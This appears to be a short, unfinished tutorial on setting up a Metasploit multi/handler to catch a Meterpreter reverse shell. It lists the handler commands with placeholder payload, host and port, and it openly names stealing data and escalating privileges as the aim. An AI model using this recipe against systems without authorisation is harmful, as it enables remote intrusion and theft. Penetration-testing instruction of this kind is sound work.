So using the Metasploit Framework you can create a malicous payload (Meterpreter Reverse Shell) and then setup a handler to recieve this connection.
By doing this you have a shell on the target machine which you can then esclate priveilges, steal data or any other post exploition.


This images shows how reverse and bind shells work.

First step is to setup a handler to recieve the reverse connection. This can be done using the Metasploit Framework as shown bellow.



### HANDLER

Metasploit handlers are best to use for meterpreter or most reverse shells.
Bellow is the code to set one up using metasploit.


```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
exploit

```

### PAYLOAD



Once the handler has been setup you will need to generate a malicous payload to run on the target machine.
Check out some common payloads with Msf Venom here  --- ADD LINK TO MSF VENOM----

### REVERSE SHELL



Once exucuted on the Target machine your attacking machine will recieve the connecting and in this case giving you a Meterpreter reverse Shell.
